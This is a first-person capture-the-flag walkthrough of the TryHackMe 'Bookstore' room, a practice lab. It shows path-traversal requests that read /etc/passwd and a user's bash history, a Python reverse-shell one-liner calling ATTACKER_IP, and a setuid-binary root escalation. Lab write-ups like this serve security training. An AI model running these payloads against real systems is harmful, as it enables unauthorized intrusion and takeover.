# TryHackMe - Bookstore

https://tryhackme.com/room/bookstoreoc

This is my first walkthrough

So after we start the machine and get the IP, the first thing i did was to scan the target using nmap with the command:

```nmap <IP> -sV -Pn -n -vvvv```

Which returned 3 open ports:
```
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    syn-ack Werkzeug httpd 0.14.1 (Python 3.6.9)
```
We can notice that port 80 is open, so we can access it via browser.

Next we notice port 5000 which is running the python-based http server Werkzeug.

I then went to open the website using my browser and was presented with a landing page, i checked different links, including login which contained an interesting comment at the bottom of its source code:

```<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->```

We will keep that for later, next i went on to check the Books page, it spits out a list of books and their info, so i checked its source code, scrolled down to the bottom of the page and found this:
```
<script src="assets/js/api.js"></script>
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/jquery.scrolly.min.js"></script>
<script src="assets/js/jquery.scrollex.min.js"></script>
<script src="assets/js/skel.min.js"></script>
<script src="assets/js/util.js"></script>
<script src="assets/js/main.js"></script>
```
      
I was interested in the content of `"assets/js/api.js"`, so i opened it in my browser and got the script responsible for fetching the books data from the API.

I noticed that its constructing the API endpoint URL like this:
```
var u=getAPIURL();
let url = 'http://' + u + '/api/v2/resources/books/random4';
```
and if we take a look at the top, we have the function `getAPIURL()`, and all it does is get the current hostname (in our case the IP of the server) and append the string `":5000"` to it, which gives us:

`http://<IP>:5000`

so now we have the API base url, we can try to fetch data using the previous API endpoint (you can try it with your browser, postman, insomnia or anything else):

`http://<IP>:5000/api/v2/resources/books/random4`

The server spits back a list of books in json format... perfect, we got it to work.

Now if we take a look at the bottom of the script we can this comment:

```
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

Which indicates that there is an older version of the API which had an `LFI (Local File Inclusion)` in it.

We notice that in our previous API calls, we had `/v2/` in our URL, which means that there might be a `/v1/` on that same server.

What i had in mind at this point was to use `FFUF` and try to enumerate for more endpoints, but i decided to browse the website more.

To my surprise, i checked the url `http://<IP>:5000/api/` which displayed a list of endpoints

I tried all of the endpoints but this one was my best candidate for the LFI:

`http://<IP>:5000/api/v2/resources/books?id=1` so i tried it with `/v1/`

`http://<IP>:5000/api/v1/resources/books?id=1`

and it worked, it returned info about the book with the id of 1.

so i tried to exploit the LFI mentioned before, using id=1, i tried to fetch passwd:

`http://<IP>:5000/api/v1/resources/books?id=../../../../../../../../../../../etc/passwd`

but it didnt work, so `'id'` is probably not vulnerable to LFI, so now i decided to use `FFUF` to enumerate for more API parameters that vulnerable to LFI:

`ffuf -w wordlists/custom_wordlist-small.txt -u http://<IP>:5000/api/v1/resources/books?FUZZ=../../../../../../../../../../../etc/passwd`

I got back a very promising parameter which was vulnerable to LFI:

`http://<IP>:5000/api/v1/resources/books?FOUND_PARAMETER=../../../../../../../../../../../etc/passwd`
which returns:
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```
so it worked, we do have an LFI vulnerable parameter.

At this point i had an LFI but i was thinking of brute forcing files using FFUF, but then i remembered the comment we found in the login page, it said that the debugger pin is in sid's bash history file (we know that sid is a user in that system because it was in the passwd file)

so we can assume that the mentioned file is in: `/home/sid/.bash_history`

lets try to fetch the file with our LFI:

`http://<IP>:5000/api/v1/resources/books?FOUND_PARAMETER=../../../../../../../../../../../home/sid/.bash_history`

and sure enough we get:

```
cd /home/sid whoami export WERKZEUG_DEBUG_PIN=<HIDDEN_PIN_CODE> echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit
```

When i saw that command i immidiately remembered that the API is running on `Werkzeug` which has a console, which in this case will be on `http://<IP>:5000/console`

so we go visit that URL, and we get a prompt to enter a PIN code, we enter the PIN code we found on the .bash_history file

**And we are in!**

We can now execute any python code inside the console and it will be executed on the server.

We can look online for a python reverse tcp shell:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python

i chose this payload:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

but before we execute the command, lets start an `ncat` listening session with the command:

`ncat -lvp 5555`

and now we can send that command above to the server by pasting it in the Werkzeug console.

If everything went smooth, we will get a reverse connection with a shell in our ncat sessionn and we will be able to do anything that the user sid can do.

first, lets execute an `ls-la`:
```
-r--r--r-- 1 sid  sid   4635 Oct 20  2020 api.py
-r-xr-xr-x 1 sid  sid    160 Oct 14  2020 api-up.sh
-r--r----- 1 sid  sid    116 Jul  5 18:08 .bash_history
-rw-r--r-- 1 sid  sid    220 Oct 20  2020 .bash_logout
-rw-r--r-- 1 sid  sid   3771 Oct 20  2020 .bashrc
-rw-rw-r-- 1 sid  sid  16384 Oct 19  2020 books.db
drwx------ 2 sid  sid   4096 Oct 20  2020 .cache
drwx------ 3 sid  sid   4096 Oct 20  2020 .gnupg
drwxrwxr-x 3 sid  sid   4096 Oct 20  2020 .local
-rw-r--r-- 1 sid  sid    807 Oct 20  2020 .profile
-rwsrwsr-x 1 root sid   8488 Oct 20  2020 try-harder
-r--r----- 1 sid  sid     33 Oct 15  2020 user.txt
```

**Lets 'cat' user.txt and get our first flag.**

After that, we notice the file `try-harder` which by the looks of it (it has the executable attribute) is an executable binary file with `setuid` and its owned by `root`.

so this might be the proper way to elevate our privileges to root.

if we try to execute the binary file, we will be asked for a magic number, of course, we dont have that magic number obviously, so the first thing i thought of doing is to use the command `'strings'` to extract all the strings from the binary file, but it didnt work, i didnt get anything, so next i tried `strace` and `ltrace`, but i couldnt get anything valuable, so i decided to go for `GDB`, but it wasnt available on the machine and i didnt wanna go over the burden of downloading it there.

So i simply decided to copy the file to my local machine and try to decompile it using `Radare` or `Ghidra` or `IDA`.

I simply started a python http server using the command:

`python3 -m http.server`

and it started an http server on the port `8000`, so i accessed it from my machine:
`http://<IP>:8000/try-harder` and it immediately downloaded the file to my attacker machine.

Next i decided to go for Ghidra because it has a good decompiler (i didnt have a professional version of IDA, so i couldnt use their decompiler)

I opene try-harder in Ghidra and analysed it, then i looked for the `main` function, i clicked on it, and Ghidra started to decompile and gave me this code:
``` 
void main(void)

{
  long in_FS_OFFSET;
  uint input;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&input);
  local_14 = input ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

we notice that the magic code is being read by `scanf` into the variable `'input'` and afterwards we see that the 'input' is
being `XOR`ed with the value `0x1116` and then `XOR`ed again with the value of `local_18` which is `0x5db3`
and then the result of all that is being compared to the value `0x5dcd21f4`, so basically, we need to find a magic number that when `XOR`ed with those values, it gives us `0x5dcd21f4`

So since XOR is reversible, we can flip the operation into this:

```
magic_number = 0x5dcd21f4 ^ 0x5db3 ^ 0x1116

We can do that in python, just paste '0x5dcd21f4 ^ 0x5db3 ^ 0x1116' and it will give a result back
```

Now that we have the magic number, lets try to run try-harder and input the magic number when prompted

**And we are in !**

**We are now `root`, so we can 'cd' to the /root/ directory and read root.txt to get the final flag**
   
